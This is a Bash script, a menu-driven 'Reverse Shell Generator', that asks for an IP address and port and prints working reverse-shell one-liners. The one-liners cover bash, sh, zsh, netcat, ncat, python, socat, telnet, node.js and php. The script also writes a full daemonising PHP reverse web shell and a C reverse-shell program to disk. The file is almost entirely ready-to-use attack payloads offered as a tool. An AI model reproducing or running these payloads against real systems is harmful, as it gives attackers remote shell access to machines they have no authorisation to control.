#!/bin/bash
# Reverse Shell Generator!

red='\033[33;31m'
green='\033[33;32m'
blue='\033[33;34m'
white='\033[1;37m'
purple='\033[0;35m'
tip='[?] Press ENTER to OPTIONS or 1 to EXIT!'
banner="

      ::: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ :::
 
          ▀██    ██▀           ▀██▀▀█▄                     ▄█▀▀▀▄█  ▀██              ▀██  ▀██  
           ███  ███   ▄▄▄▄ ▄▄▄  ██   ██    ▄▄▄▄  ▄▄▄▄ ▄▄▄  ██▄▄  ▀   ██ ▄▄     ▄▄▄▄   ██   ██  
           █▀█▄▄▀██    ▀█▄  █   ██▀▀█▀   ▄█▄▄▄██  ▀█▄  █    ▀▀███▄   ██▀ ██  ▄█▄▄▄██  ██   ██  
           █ ▀█▀ ██     ▀█▄█    ██   █▄  ██        ▀█▄█   ▄     ▀██  ██  ██  ██       ██   ██  
          ▄█▄ █ ▄██▄     ▀█    ▄██▄  ▀█▀  ▀█▄▄▄▀    ▀█    █▀▄▄▄▄█▀  ▄██▄ ██▄  ▀█▄▄▄▀ ▄██▄ ▄██▄ 
                       ▄▄ █                                                                     
                         ▀▀             $purple——==[[乃ㄚ 卄0尺ㄩ]]==——$red                                                      
      ::: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ :::

"

usage() {


echo -e "$red 
           $banner

           $blue How to use? $white

       1. In your prompt only call$green myrshell$white

       2. Select a reverse shell and copy from the screen


           $blue Models: $white
      🐚
       ├── sh 
       ├── zsh 
       ├── bash 
       ├── php exec 
       ├── nc -c 
       ├── nc -e 
       ├── nc.exe -e 
       ├── nc mkfifo 
       ├── ncat -e 
       ├── ncat.exe 
       ├── python 
       ├── python3 
       ├── python3 short 
       ├── socat
       ├── telnet
       └── node.js 

      🕸️
       └── Web Shell 

       C
       ├── C Shell 
       └── Compile 


"
  exit 0
}

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)
      usage
      ;;
    *)
      echo -e "Error, invalid option: $1"
      exit 1
      ;;
  esac
  shift
done


echo -e "$red$banner$white"

PS3='> Option: '
type=(
"Exit"
"Help"
"sh"
"zsh"
"bash"
"php exec"
"nc -c"
"nc -e"
"nc.exe -e"
"nc mkfifo"
"ncat -e"
"ncat.exe -e"
"python"
"python3"
"python3 short"
"socat"
"telnet"
"node.js"
"web shell"
"c shell"
)
select var in "${type[@]}"; do
case $var in
"Exit")
exit
     ;;
"Help")
       clear
       echo
       echo -e "$blue
                Models Preview:"
       echo -e "$white
      🐚
       ├── sh >> sh -i >& /dev/tcp/#ip/#door 0>&1
       ├── zsh >> zsh -c 'zmodload zsh/net/tcp && ztcp #ip #door && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
       ├── bash >> bash -i >& /dev/tcp/#ip/#door 0>&1
       ├── php exec >> php -r '"'$sock=fsockopen("#ip",#door);exec("bash <&3 >&3 2>&3");'"'
       ├── nc -c >> nc -c bash #ip #door 
       ├── nc -e >> nc #ip #door -e bash
       ├── nc.exe -e >> nc.exe #ip #door -e bash
       ├── nc mkfifo >> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc #ip #door >/tmp/f
       ├── ncat -e >> ncat #ip #door -e bash
       ├── ncat.exe -e >> ncat.exe #ip #door -e bash
       ├── python >> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
       ├── python3 >> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("#ip",#door));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
       ├── python3 short >> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("#ip",#door));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
       ├── socat >> socat TCP:#ip:#door EXEC:'bash',pty,stderr,setsid,sigint,sane
       ├── telnet >> TF=$(mktemp -u);mkfifo $TF && telnet #ip #door 0<$TF | bash 1>$TF
       └── node.js >> require('child_process').exec('bash -i >& /dev/tcp/#ip/#port 0>&1');

      🕸️
       └── Web Shell >> /path/shell_name.php

       C
       ├── C Shell >> /path/shell_name.c
       └── Compile >> gcc -o shell_name shell_name.c
               "
               echo -e "$green $tip"
               echo -e "$white" 
;; 
"sh")
       echo 
       echo -e ">   🐚 ~ SH "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:

       👉 sh -i >& /dev/tcp/$ip/$door 0>&1
               "   
               echo -e "$green $tip"
               echo -e "$white"    
;; 
"zsh")
       echo 
       echo -e ">   🐚 ~ ZSH "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:

       👉 zsh -c 'zmodload zsh/net/tcp && ztcp $ip $door && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
               "
               echo -e "$green $tip"
               echo -e "$white"
       
;; 
"bash")
       echo 
       echo -e ">   🐚 ~ BASH "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:

       👉 bash -i >& /dev/tcp/$ip/$door 0>&1
               "
               echo -e "$green $tip"
               echo -e "$white"       
;;
"php exec")
       echo 
       echo -e ">   🐚 ~ PHP Exec "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:

       👉 php -r '"'$sock=fsockopen("'"$ip"'",'$door');exec("bash <&3 >&3 2>&3");'"'
               "
               echo -e "$green $tip"
               echo -e "$white"  
;; 
"nc -c")
       echo 
       echo -e ">   🐚 ~ NC -c "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 nc -c bash $ip $door
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"nc -e")
       echo 
       echo -e ">   🐚 ~ NC -e "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 nc $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"      
;; 
"nc.exe -e")
       echo 
       echo -e ">   🐚 ~ NC.exe -e "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 nc.exe $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"nc mkfifo")
       echo 
       echo -e ">   🐚 ~ NC mkfifo "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip $door >/tmp/f
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"ncat")
       echo 
       echo -e ">   🐚 ~ NCAT "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 ncat $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"       
;; 
"ncat.exe -e")
       echo 
       echo -e ">   🐚 ~ NCAT.exe -e "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 ncat.exe $ip $door -e bash
               "
               echo -e "$green $tip"
               echo -e "$white"   
;; 
"python")
       echo 
       echo -e ">   🐚 ~ Python "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 python -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$door'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
               "
               echo -e "$green $tip"
               echo -e "$white"         
;; 
"python3")
       echo 
       echo -e ">   🐚 ~ Python3 "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 python3 -c '"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$ip"'",'$door'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"'
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"python3 short")
       echo 
       echo -e ">   🐚 ~ Python3 Short "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 python3 -c '"'import os,pty,socket;s=socket.socket();s.connect(("'"$ip"'",'$door'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'"'
               "
               echo -e "$green $tip"
               echo -e "$white"     
;; 
"socat")
       echo 
       echo -e ">   🐚 ~ Socat "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 socat TCP:$ip:$door EXEC:'bash',pty,stderr,setsid,sigint,sane
               "
               echo -e "$green $tip"
               echo -e "$white"        
;;
"telnet")
       echo 
       echo -e ">   🐚 ~ Telnet "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 TF=$(mktemp -u);mkfifo $TF && telnet $ip $door 0<$TF | bash 1>$TF
               "
               echo -e "$green $tip"
               echo -e "$white"        
;;
"node.js")
       echo 
       echo -e ">   🐚 ~ Node.js "
       read -p ">   📍 ~ IP: " ip
       read -p ">   🚪 ~ DOOR: " door 
       clear
       echo -e "> Shell:
       
       👉 require('child_process').exec('bash -i >& /dev/tcp/$ip/$door 0>&1');
               "
               echo -e "$green $tip"
               echo -e "$white"        
;;
"web shell")
       echo
       echo -e ">   🐚 ~ Web Shell "
       read -p ">   📍 ~ IP: " ALTERN1
       read -p ">   🚪 ~ DOOR: " ALTERN2
       read -p ">   📁 ~ Path to save the file: " path
       clear
       cat << 'EOF' > $path
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = 'ALTERN1';  
$port = ALTERN2;       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;



if (function_exists('pcntl_fork')) {

        $pid = pcntl_fork();
        
        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }
        
        if ($pid) {
                exit(0);  
        }


        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}


chdir("/");


umask(0);


$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}


$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}


stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {

        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }


        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }


        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);


        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }


        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }


        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);


function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
EOF

       sed -i "s/ALTERN1/$ALTERN1/" $path
       sed -i "s/ALTERN2/$ALTERN2/" $path
       echo -e "> Shell:
       
       👉 $path
               "
       echo -e "$green $tip"
       echo -e "$white"        
;;
"c shell")
      echo
       echo -e ">   🐚 ~ C Shell "
       read -p ">   📍 ~ IP: " ALTERN1
       read -p ">   🚪 ~ DOOR: " ALTERN2
       read -p ">   📁 ~ Path to save the file: " path
       clear
       cat << 'EOF' > $path
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#define ATTACKER_IP "ALTERN1"
#define ATTACKER_PORT ALTERN2
int main(void) {
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(ATTACKER_PORT);
    sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        printf("[ERROR] connection failed.\n");
        return (1);
    }
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char *const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);
    return (0);
}
EOF

       sed -i "s/ALTERN1/$ALTERN1/" $path
       sed -i "s/ALTERN2/$ALTERN2/" $path
       echo -e "> Shell:
       
       👉 $path
               "
       echo -e "$green $tip"
       echo -e "$white"
;;
   esac
done
